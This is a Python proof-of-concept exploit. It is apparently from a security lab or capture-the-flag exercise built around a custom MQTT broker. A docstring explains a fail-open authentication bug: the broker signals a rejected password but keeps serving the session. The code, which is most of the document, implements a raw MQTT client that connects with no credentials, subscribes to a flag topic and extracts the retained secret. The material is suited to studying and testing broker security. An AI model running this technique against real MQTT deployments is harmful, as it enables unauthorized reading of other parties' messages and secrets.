#!/usr/bin/env python3
"""
PoC #1: Fail-open AUTH gate (a configured password is never enforced)
----------------------------------------------------------------------
Location: Broker._handle_connect() in mqb/broker.py. When MQB_REQUIREPASS is
configured, the broker computes the credential result (via
_check_credentials()) and even reports it faithfully in the CONNACK -- a bad
or absent password gets CONNACK rc=4 (bad username or password), so on the
wire the deployment LOOKS protected. But that return code is the ONLY thing a
failed credential changes: MQTT-3.2.2-5 requires the server to close the
network connection after a failure CONNACK, and this broker instead falls
straight through, registers the session, and serves it in full. So a
configured password buys nothing -- any client that can open a socket gets
unauthenticated PUBLISH/SUBSCRIBE, no matter what MQB_REQUIREPASS is set to.
This is the exact "auth configured but never enforced" shape as
keystore-module VULN #1, and the root trust bug the wildcard-subscribe (#2)
and retained-message-poisoning (#3) vulns hang off.

The scoreable secret this PoC steals: at startup MQB pre-seeds a RETAINED
message on a fixed topic (MQB_FLAG_TOPIC, default "fleet/control/flag") whose
payload is MQB_FLAG -- a real, per-deployment secret minted by
../../generate-secrets.sh (see Broker.seed_startup_state() in mqb/broker.py).
This PoC connects with NO credentials at all, shows the broker answering
CONNACK rc=4 ("looks protected"), then SUBSCRIBEs to that flag topic anyway
and receives the real seeded flag via retained delivery -- disclosure with
zero credentials.

(Contrast #2: this bug is the *authentication* bypass -- an unauthenticated
stranger is served at all. #2 is the missing *authorization* -- even a
properly authenticated client can subscribe to "#"/other tenants' topics.
This PoC therefore subscribes to the flag topic specifically, not "#".)

Run: python3 01_no_auth_default.py [host] [port]
"""
import os
import re
import socket
import struct
import sys
import time
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
# The fixed topic the broker seeds MQB_FLAG on at startup -- see
# Config.from_env() / Broker.seed_startup_state().
FLAG_TOPIC = os.environ.get("MQB_FLAG_TOPIC", "fleet/control/flag")
FLAG_RE = re.compile(rb"FLAG\{[^}]*\}")

CONNACK, PUBLISH, SUBACK = 2, 3, 9


# --- minimal hand-rolled MQTT 3.1.1 client (stdlib only) ---------------------

def _u8(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def _rl(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def build_connect(client_id, clean_session=1, username=None, password=None, keep_alive=30):
    flags = (clean_session & 1) << 1
    if username is not None:
        flags |= 0x80
    if password is not None:
        flags |= 0x40
    body = _u8("MQTT") + bytes([4, flags]) + struct.pack("!H", keep_alive) + _u8(client_id)
    if username is not None:
        body += _u8(username)
    if password is not None:
        pb = password.encode() if isinstance(password, str) else password
        body += struct.pack("!H", len(pb)) + pb
    return bytes([0x10]) + _rl(len(body)) + body


def build_subscribe(filters, packet_id=1):
    body = struct.pack("!H", packet_id)
    for f, q in filters:
        body += _u8(f) + bytes([q])
    return bytes([0x82]) + _rl(len(body)) + body


def recv_packet(sock, timeout=5.0):
    sock.settimeout(timeout)
    try:
        first = sock.recv(1)
        if not first:
            return None
        ptype = first[0] >> 4
        mult, val = 1, 0
        while True:
            b = sock.recv(1)[0]
            val += (b & 0x7F) * mult
            if not (b & 0x80):
                break
            mult *= 128
        body = b""
        while len(body) < val:
            chunk = sock.recv(val - len(body))
            if not chunk:
                break
            body += chunk
        return ptype, body
    except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
        # Server closed the connection (RST / broken pipe) mid-read -- treat
        # the same as a clean EOF so callers funnel into their "closed" path.
        return None


def _wait_for_server(timeout=15.0):
    """Wait for the broker's MQTT port to accept connections. Guards against
    the PoC racing the container's startup when invoked directly via
    `docker compose run --rm poc python3 NN_slug.py <host> <port>`."""
    deadline = time.time() + timeout
    last_err = None
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            s.close()
            return
        except OSError as e:
            last_err = e
            time.sleep(0.3)
    raise RuntimeError(f"server never came up on {HOST}:{PORT}: {last_err}")


def main():
    _wait_for_server()

    token = uuid.uuid4().hex[:12]

    # Connect with NO username and NO password -- a purely anonymous CONNECT.
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(build_connect(f"poc1-anon-{token}"))
    r = recv_packet(s)
    rc = r[1][1] if r and r[0] == CONNACK else None
    if rc == 4:
        print("[*] anonymous CONNECT -> CONNACK rc=4 (bad username or password): "
              "the broker HAS a password configured and signals rejection -- it looks protected")
    elif rc == 0:
        print("[*] anonymous CONNECT -> CONNACK rc=0: broker accepted an anonymous client outright "
              "(no MQB_REQUIREPASS configured on this instance)")
    else:
        print(f"[-] unexpected CONNACK ({r!r}); cannot continue")
        s.close()
        return 1

    # ...but despite that rejection code, the session was never closed. Use it:
    # subscribe to the seeded flag topic specifically (not '#') and read the
    # retained secret straight off the wire, with no credentials at all.
    try:
        s.sendall(build_subscribe([(FLAG_TOPIC, 0)]))
        r = recv_packet(s)
    except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
        # Fixed broker closes the socket after the failure CONNACK
        # (MQTT-3.2.2-5), so the SUBSCRIBE write itself can fault. Same signal.
        r = None
    if not r or r[0] != SUBACK:
        print(f"[-] no SUBACK after anonymous SUBSCRIBE ({r!r}); the gate may actually be enforced -- FIXED")
        s.close()
        return 1
    print(f"[*] SUBACK received for anonymous SUBSCRIBE to {FLAG_TOPIC!r} -- the session was served")

    flag = None
    deadline = time.time() + 3.0
    while time.time() < deadline:
        r = recv_packet(s, timeout=3.0)
        if not r:
            break
        if r[0] == PUBLISH:
            m = FLAG_RE.search(r[1])
            if m:
                flag = m.group(0)
                break
    s.close()

    if flag:
        gate = "signalled rc=4 (looks protected)" if rc == 4 else "required no auth at all"
        print(f"[*] retained secret delivered on {FLAG_TOPIC!r}: {flag.decode()}")
        print(f"[+] Confirmed: the broker {gate} yet served an unauthenticated client full "
              f"SUBSCRIBE access and handed over the real per-deployment secret ({flag.decode()}) "
              f"-- the configured AUTH gate is fail-open")
        return 0

    print("[-] connected/subscribed but no flag retained on the topic "
          "(was the seed cleared, e.g. by PoC #3 poisoning?)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
